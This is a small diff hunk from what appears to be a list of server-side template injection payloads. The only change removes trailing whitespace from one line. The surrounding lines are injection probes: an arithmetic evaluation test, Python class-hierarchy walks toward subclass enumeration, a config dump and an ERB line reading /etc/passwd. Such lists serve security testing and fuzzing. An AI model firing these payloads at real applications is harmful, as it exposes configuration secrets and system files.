@@ -14,7 +14,7 @@ ${{7*7}}
 {{''.class.mro()[1].subclasses()}}
 {{ ''.__class__.__mro__[2].__subclasses__() }}
 {% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
-{{'a'.toUpperCase()}} 
+{{'a'.toUpperCase()}}
 {{ request }}
 {{self}}
 <%= File.open('/etc/passwd').read %>
